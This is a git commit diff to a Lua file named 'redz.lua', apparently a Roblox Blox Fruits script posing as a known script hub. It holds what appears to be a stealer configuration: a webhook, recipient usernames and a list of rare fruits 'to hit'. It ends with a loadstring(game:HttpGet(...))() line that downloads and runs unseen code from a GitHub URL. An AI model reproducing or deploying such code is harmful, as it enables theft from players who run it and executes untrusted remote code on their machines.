a917c27c91fa05cdca0644afdbb9fe21e9a946b0
Zredzhub <charlestiaba12@gmail.com>
2025-04-01 21:51:57 +0800

    redz.lua

--- redz.lua
+++ redz.lua
@@ -1,5 +1,5 @@
 Webhook = "" -- << Your Webhook
 Usernames = {"zachtjiop", "kilamirato"} -- << Your username(-s).
-FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "Dragon-Dragon"} -- << Fruits you want
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
